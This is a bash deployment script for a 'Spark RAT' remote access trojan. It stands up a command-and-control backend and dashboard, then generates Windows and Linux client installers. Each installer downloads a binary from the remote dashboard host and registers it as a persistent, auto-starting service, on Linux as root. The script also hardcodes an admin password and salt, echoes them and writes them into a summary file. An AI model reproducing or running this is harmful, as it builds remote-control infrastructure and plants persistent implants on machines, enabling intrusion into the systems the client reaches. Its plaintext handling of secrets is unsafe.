#!/bin/bash

# Production Deployment Script for Spark RAT System
# This script deploys the complete Spark RAT system to production

set -e

echo "🚀 Starting Production Deployment of Spark RAT System..."

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m' # No Color

# Function to print colored output
print_status() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

print_step() {
    echo -e "${PURPLE}[STEP]${NC} $1"
}

# Configuration
BACKEND_URL="https://spark-backend-fixed-v2.onrender.com"
FRONTEND_URL="https://spark-rat-dashboard.vercel.app"
ADMIN_PASSWORD="ChangeMe2024!SecurePassword"
SALT="a2dac101827c8d47f00831f2d6c078b2"

# Check if we're in the right directory
if [ ! -f "render.yaml" ] || [ ! -d "spark-setup" ]; then
    print_error "Please run this script from the project root directory."
    exit 1
fi

print_step "Phase 1: Pre-deployment Checks"

# Check if required tools are installed
print_status "Checking required tools..."

if ! command -v git &> /dev/null; then
    print_error "Git is not installed. Please install Git first."
    exit 1
fi

if ! command -v curl &> /dev/null; then
    print_error "curl is not installed. Please install curl first."
    exit 1
fi

print_success "Required tools are available"

# Check if we're on the correct branch
CURRENT_BRANCH=$(git branch --show-current)
if [ "$CURRENT_BRANCH" != "main" ] && [ "$CURRENT_BRANCH" != "master" ]; then
    print_warning "You are not on the main/master branch. Current branch: $CURRENT_BRANCH"
    read -p "Do you want to continue? (y/N): " -n 1 -r
    echo
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        print_error "Deployment cancelled."
        exit 1
    fi
fi

print_success "Branch check passed"

print_step "Phase 2: Backend Deployment"

# Deploy backend to Render
print_status "Deploying backend to Render..."

if [ -f "deploy-render.sh" ]; then
    if ./deploy-render.sh; then
        print_success "Backend deployed to Render"
    else
        print_error "Backend deployment failed"
        exit 1
    fi
else
    print_warning "deploy-render.sh not found. Please deploy backend manually."
    print_status "Backend URL: $BACKEND_URL"
fi

# Wait for backend to be ready
print_status "Waiting for backend to be ready..."
sleep 30

# Test backend health
print_status "Testing backend health..."
if curl -f -s --max-time 30 "$BACKEND_URL/api/info" > /dev/null; then
    print_success "Backend is healthy"
else
    print_warning "Backend health check failed. It may still be starting up."
fi

print_step "Phase 3: Frontend Deployment"

# Deploy frontend to Vercel
print_status "Deploying frontend to Vercel..."

if [ -f "deploy-vercel.sh" ]; then
    if ./deploy-vercel.sh; then
        print_success "Frontend deployed to Vercel"
    else
        print_error "Frontend deployment failed"
        exit 1
    fi
else
    print_warning "deploy-vercel.sh not found. Please deploy frontend manually."
    print_status "Frontend URL: $FRONTEND_URL"
fi

print_step "Phase 4: Configuration Verification"

# Verify backend configuration
print_status "Verifying backend configuration..."

BACKEND_RESPONSE=$(curl -s --max-time 30 "$BACKEND_URL/api/info" 2>/dev/null || echo "ERROR")
if [ "$BACKEND_RESPONSE" != "ERROR" ]; then
    print_success "Backend is responding"
    echo "Response: $BACKEND_RESPONSE"
else
    print_error "Backend is not responding"
fi

# Verify frontend configuration
print_status "Verifying frontend configuration..."

if curl -f -s --max-time 30 "$FRONTEND_URL" > /dev/null; then
    print_success "Frontend is responding"
else
    print_warning "Frontend may still be deploying"
fi

print_step "Phase 5: Security Configuration"

# Generate new admin password hash
print_status "Generating new admin password hash..."

if command -v python3 &> /dev/null; then
    NEW_HASH=$(python3 -c "
import bcrypt
password = '$ADMIN_PASSWORD'
salt = bcrypt.gensalt()
hash = bcrypt.hashpw(password.encode('utf-8'), salt)
print(hash.decode())
" 2>/dev/null)
    
    if [ -n "$NEW_HASH" ]; then
        print_success "New admin password hash generated"
        print_warning "IMPORTANT: Update SPARK_ADMIN_HASH in Render with: $NEW_HASH"
    else
        print_warning "Could not generate password hash. Please generate manually."
    fi
else
    print_warning "Python3 not available. Please generate password hash manually."
fi

# Generate new salt
print_status "Generating new salt..."

if command -v openssl &> /dev/null; then
    NEW_SALT=$(openssl rand -hex 16)
    print_success "New salt generated: $NEW_SALT"
    print_warning "IMPORTANT: Update SPARK_SALT in Render and client configurations with: $NEW_SALT"
else
    print_warning "OpenSSL not available. Please generate salt manually."
fi

print_step "Phase 6: Client Configuration"

# Create client installation scripts
print_status "Creating client installation scripts..."

# Windows installation script
cat > install-windows.ps1 << 'EOF'
# Spark RAT Client Installation Script for Windows
# Run as Administrator

Write-Host "Installing Spark RAT Client..." -ForegroundColor Green

# Configuration
$CLIENT_URL = "https://spark-rat-dashboard.vercel.app/api/client/download/windows"
$INSTALL_DIR = "C:\Program Files\SparkRAT"
$SERVICE_NAME = "SparkRAT"

try {
    # Create installation directory
    New-Item -ItemType Directory -Force -Path $INSTALL_DIR | Out-Null
    
    # Download client
    Write-Host "Downloading client..." -ForegroundColor Yellow
    Invoke-WebRequest -Uri $CLIENT_URL -OutFile "$INSTALL_DIR\spark-client.exe"
    
    # Install as service
    Write-Host "Installing service..." -ForegroundColor Yellow
    New-Service -Name $SERVICE_NAME -BinaryPathName "$INSTALL_DIR\spark-client.exe" -StartupType Automatic | Out-Null
    
    # Start service
    Write-Host "Starting service..." -ForegroundColor Yellow
    Start-Service -Name $SERVICE_NAME
    
    Write-Host "Installation completed successfully!" -ForegroundColor Green
    Write-Host "Service status:" -ForegroundColor Cyan
    Get-Service -Name $SERVICE_NAME
}
catch {
    Write-Host "Installation failed: $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}
EOF

# Linux installation script
cat > install-linux.sh << 'EOF'
#!/bin/bash

# Spark RAT Client Installation Script for Linux
# Run with sudo

echo "Installing Spark RAT Client..."

# Configuration
CLIENT_URL="https://spark-rat-dashboard.vercel.app/api/client/download/linux"
INSTALL_DIR="/opt/sparkrat"
SERVICE_NAME="sparkrat"

# Detect architecture
ARCH=$(uname -m)
case $ARCH in
    x86_64) CLIENT_URL="${CLIENT_URL}-amd64" ;;
    arm64|aarch64) CLIENT_URL="${CLIENT_URL}-arm64" ;;
    *) echo "Unsupported architecture: $ARCH"; exit 1 ;;
esac

# Create installation directory
mkdir -p $INSTALL_DIR

# Download client
echo "Downloading client..."
curl -L -o $INSTALL_DIR/spark-client $CLIENT_URL
chmod +x $INSTALL_DIR/spark-client

# Create systemd service
cat > /etc/systemd/system/$SERVICE_NAME.service << EOL
[Unit]
Description=Spark RAT Client
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$INSTALL_DIR
ExecStart=$INSTALL_DIR/spark-client
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOL

# Enable and start service
systemctl daemon-reload
systemctl enable $SERVICE_NAME
systemctl start $SERVICE_NAME

echo "Installation completed successfully!"
echo "Service status:"
systemctl status $SERVICE_NAME
EOF

chmod +x install-linux.sh

print_success "Client installation scripts created"

print_step "Phase 7: Documentation Generation"

# Generate deployment summary
cat > DEPLOYMENT_SUMMARY.md << EOF
# Spark RAT Production Deployment Summary

## Deployment Information

- **Deployment Date**: $(date)
- **Backend URL**: $BACKEND_URL
- **Frontend URL**: $FRONTEND_URL
- **Admin Password**: $ADMIN_PASSWORD
- **Salt**: $SALT

## Next Steps

1. **Update Security Credentials**
   - Change admin password
   - Rotate encryption salt
   - Update environment variables

2. **Test System**
   - Verify backend health
   - Test frontend functionality
   - Deploy test client
   - Verify end-to-end functionality

3. **Configure Monitoring**
   - Set up health checks
   - Configure alerts
   - Set up dashboards
   - Test incident response

4. **Security Hardening**
   - Review security checklist
   - Implement additional security measures
   - Conduct security audit
   - Update documentation

## Access Information

- **Dashboard**: $FRONTEND_URL
- **API**: $BACKEND_URL/api
- **WebSocket**: wss://spark-backend-fixed-v2.onrender.com/ws

## Support

- **Documentation**: See project README files
- **Issues**: GitHub Issues
- **Monitoring**: Render and Vercel dashboards

---

**Deployment Status**: Complete
**Version**: 2.0.0
EOF

print_success "Deployment summary generated"

print_step "Phase 8: Final Verification"

# Final system check
print_status "Performing final system check..."

# Check backend
if curl -f -s --max-time 30 "$BACKEND_URL/api/info" > /dev/null; then
    print_success "✅ Backend is healthy"
else
    print_error "❌ Backend health check failed"
fi

# Check frontend
if curl -f -s --max-time 30 "$FRONTEND_URL" > /dev/null; then
    print_success "✅ Frontend is accessible"
else
    print_error "❌ Frontend accessibility check failed"
fi

# Check WebSocket
if command -v wscat &> /dev/null; then
    print_status "Testing WebSocket connection..."
    if timeout 10 wscat -c "wss://spark-backend-fixed-v2.onrender.com/ws" --close &>/dev/null; then
        print_success "✅ WebSocket is working"
    else
        print_warning "⚠️ WebSocket test failed (may be normal if no clients connected)"
    fi
else
    print_warning "⚠️ wscat not available, skipping WebSocket test"
fi

print_success "🎉 Production deployment completed successfully!"

echo ""
print_status "=== DEPLOYMENT SUMMARY ==="
echo "Backend URL: $BACKEND_URL"
echo "Frontend URL: $FRONTEND_URL"
echo "Admin Password: $ADMIN_PASSWORD"
echo "Salt: $SALT"
echo ""
print_status "Next steps:"
echo "1. Update security credentials"
echo "2. Test the system thoroughly"
echo "3. Configure monitoring and alerts"
echo "4. Review security checklist"
echo "5. Deploy clients to test devices"
echo ""
print_success "Deployment script completed!"